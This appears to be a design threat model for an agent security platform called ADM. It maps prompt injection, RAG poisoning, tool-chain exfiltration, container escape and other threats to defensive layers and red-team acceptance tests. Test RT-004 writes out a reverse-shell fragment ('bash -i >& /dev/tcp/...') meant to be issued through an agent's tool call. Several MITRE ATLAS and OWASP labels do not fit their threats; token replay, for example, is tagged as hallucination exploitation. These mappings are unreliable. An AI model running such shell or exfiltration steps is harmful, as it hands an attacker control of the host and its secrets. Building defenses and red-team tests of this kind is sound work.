# ADM Threat Model — MITRE ATLAS Mapping

## Overview

This document maps Agentic AI threats from MITRE ATLAS and OWASP LLM Top 10 to ADM's defensive layers.

## Threat Matrix

### 1. Indirect Prompt Injection (AML.T0051 / OWASP LLM01)

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Malicious content injected via RAG knowledge base, tool outputs, or external data sources |
| **MITRE Technique** | AML.T0051: LLM Prompt Injection |
| **OWASP** | LLM01: Prompt Injection |
| **ADM Defense Layer** | Gateway (Semantic Middleware) + SIEM |
| **Detection Method** | Embedding-based semantic similarity analysis, input sanitization, intent classification |
| **Response** | Rate limit, block request, alert SIEM |
| **Acceptance Test** | RT-001: Inject malicious instructions via RAG context |

### 2. Tool Chain Abuse (AML.T0052)

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Chaining legitimate tool calls to achieve unauthorized outcomes |
| **MITRE Technique** | AML.T0052: LLM Tool Chain Abuse |
| **ADM Defense Layer** | SIEM (Correlation Rules) + Policy Engine |
| **Detection Method** | Time-window correlation of tool call sequences |
| **Response** | Block subsequent calls, revoke session token |
| **Acceptance Test** | RT-002: read_secret → external_send chain |

### 3. RAG Poisoning (AML.T0054 / OWASP LLM05)

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Injecting adversarial content into knowledge bases to manipulate agent behavior |
| **MITRE Technique** | AML.T0054: LLM Data Poisoning |
| **OWASP** | LLM05: Improper Output Handling |
| **ADM Defense Layer** | Semantic Analysis + Watchdog (Egress) |
| **Detection Method** | URL/domain analysis in LLM outputs, query pattern anomalies |
| **Response** | Block outbound requests to malicious domains |
| **Acceptance Test** | RT-003: Inject malicious URLs into knowledge base |

### 4. Reverse Shell / Code Execution (AML.T0057 / OWASP LLM08)

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Tricking agent into executing reverse shell or arbitrary code |
| **MITRE Technique** | AML.T0057: LLM Remote Code Execution |
| **OWASP** | LLM08: Excessive Agency |
| **ADM Defense Layer** | Watchdog (macOS ES / Windows WFP) + Ephemeral Sandbox |
| **Detection Method** | Process execution monitoring, network connection interception |
| **Response** | Kill container, block network, alert SIEM |
| **Acceptance Test** | RT-004: bash -i >& /dev/tcp/... via tool call |

### 5. Confused Deputy Attack

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Exploiting agent's elevated privileges to perform unauthorized actions |
| **MITRE Technique** | AML.T0053: LLM Supply Chain Vulnerabilities |
| **ADM Defense Layer** | OPA Policy Engine + Dynamic IAM |
| **Detection Method** | Role-based access control, permission boundary enforcement |
| **Response** | Deny tool access, downgrade permissions |
| **Acceptance Test** | RT-005: Trick agent into privilege escalation |

### 6. Token Replay / Session Hijacking

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Capturing and replaying authentication tokens |
| **MITRE Technique** | AML.T0058: LLM Hallucination Exploitation |
| **ADM Defense Layer** | SPIRE (mTLS) + Short-lived JWTs |
| **Detection Method** | Token binding, session age validation, IP binding |
| **Response** | Immediate token revocation, session termination |
| **Acceptance Test** | RT-006: Replay captured JWT |

### 7. Data Exfiltration (OWASP LLM06)

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Exfiltrating sensitive data via DNS tunneling, HTTP POST, or covert channels |
| **MITRE Technique** | AML.T0059: LLM Data Exfiltration |
| **OWASP** | LLM06: Sensitive Information Disclosure |
| **ADM Defense Layer** | Watchdog (Egress Blocker) + SIEM |
| **Detection Method** | Egress filtering, DNS interception, anomaly detection |
| **Response** | Drop connection, block endpoint, alert SIEM |
| **Acceptance Test** | RT-007: DNS tunnel / HTTP POST to external |

### 8. Container Escape

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Escaping the ephemeral sandbox to access host resources |
| **MITRE Technique** | AML.T0060: LLM Denial of Service |
| **ADM Defense Layer** | Docker Security Profiles + Watchdog |
| **Detection Method** | Mount restrictions, capability dropping, seccomp profiles |
| **Response** | Kill container, alert SIEM |
| **Acceptance Test** | RT-008: Mount host filesystem attempts |

### 9. Rate Abuse / DoS

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Automated high-frequency probing to overwhelm the system |
| **MITRE Technique** | AML.T0060: LLM Denial of Service |
| **ADM Defense Layer** | Gateway (Rate Limiter) + SIEM |
| **Detection Method** | Sliding window rate limiting, semantic similarity clustering |
| **Response** | Rate limit, block session, alert SIEM |
| **Acceptance Test** | RT-009: 1000 req/min automated probing |

### 10. State Drift / Context Manipulation

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Modifying agent context mid-session to alter behavior |
| **MITRE Technique** | AML.T0051: LLM Prompt Injection (variant) |
| **ADM Defense Layer** | Stateless Agent Design + Session Integrity |
| **Detection Method** | Session state hash verification, context integrity checks |
| **Response** | Terminate session, alert SIEM |
| **Acceptance Test** | RT-010: Modify agent context mid-session |

### 11. LLM Supply Chain Attack

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Using a compromised or malicious LLM model |
| **MITRE Technique** | AML.T0053: LLM Supply Chain Vulnerabilities |
| **ADM Defense Layer** | Model Hash Verification + Ollama Registry |
| **Detection Method** | Model digest verification at load time, integrity checksums |
| **Response** | Reject model, alert SIEM |
| **Acceptance Test** | RT-011: Load tampered Ollama model |

### 12. Log Injection

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Crafting payloads that inject false entries into security logs |
| **MITRE Technique** | AML.T0051: LLM Prompt Injection (variant) |
| **ADM Defense Layer** | Telemetry Input Sanitization |
| **Detection Method** | Input encoding, log format validation |
| **Response** | Sanitize input, reject malformed entries |
| **Acceptance Test** | RT-012: Crafted payloads in user input |

### 13. TOCTOU Race Condition

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Exploiting time-of-check-time-of-use gaps in policy enforcement |
| **MITRE Technique** | AML.T0057: LLM Remote Code Execution (variant) |
| **ADM Defense Layer** | Atomic Session State Transitions |
| **Detection Method** | Lock-free state management, atomic operations |
| **Response** | Reject conflicting state, alert SIEM |
| **Acceptance Test** | RT-013: Race condition in policy check |

### 14. DNS Rebinding

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Bypassing egress filters via DNS rebinding attacks |
| **MITRE Technique** | AML.T0059: LLM Data Exfiltration (variant) |
| **ADM Defense Layer** | Watchdog DNS Interception |
| **Detection Method** | DNS query monitoring, IP validation post-resolution |
| **Response** | Block DNS query, alert SIEM |
| **Acceptance Test** | RT-014: DNS rebinding bypass attempt |

### 15. Watchdog Privilege Escalation

| Aspect | Detail |
|--------|--------|
| **Attack Vector** | Escalating privileges through the Watchdog daemon itself |
| **MITRE Technique** | AML.T0053: LLM Supply Chain Vulnerabilities |
| **ADM Defense Layer** | Sandboxed Watchdog Process |
| **Detection Method** | Capability dropping, seccomp, namespace isolation |
| **Response** | Process termination, host alert |
| **Acceptance Test** | RT-015: Exploit Watchdog → root |

## Defense Layers Summary

```
┌─────────────────────────────────────────────────────┐
│                    User Request                      │
├─────────────────────────────────────────────────────┤
│ Layer 1: Rate Limiting (Gateway)                    │
├─────────────────────────────────────────────────────┤
│ Layer 2: Semantic Analysis (Gateway)                │
├─────────────────────────────────────────────────────┤
│ Layer 3: OPA Policy Evaluation (Policy Engine)      │
├─────────────────────────────────────────────────────┤
│ Layer 4: SPIRE mTLS + Short-lived JWTs (Auth)       │
├─────────────────────────────────────────────────────┤
│ Layer 5: Ephemeral Sandboxing (Executor)            │
├─────────────────────────────────────────────────────┤
│ Layer 6: Syscall Interception (Watchdog)            │
├─────────────────────────────────────────────────────┤
│ Layer 7: Egress Filtering (Watchdog)                │
├─────────────────────────────────────────────────────┤
│ Layer 8: Correlation & Alerting (SIEM)              │
├─────────────────────────────────────────────────────┤
│ Layer 9: Green Team Auto-Response                   │
│   ├── Revoke Token                                  │
│   ├── Kill Container                                │
│   └── Block Egress                                  │
└─────────────────────────────────────────────────────┘
```
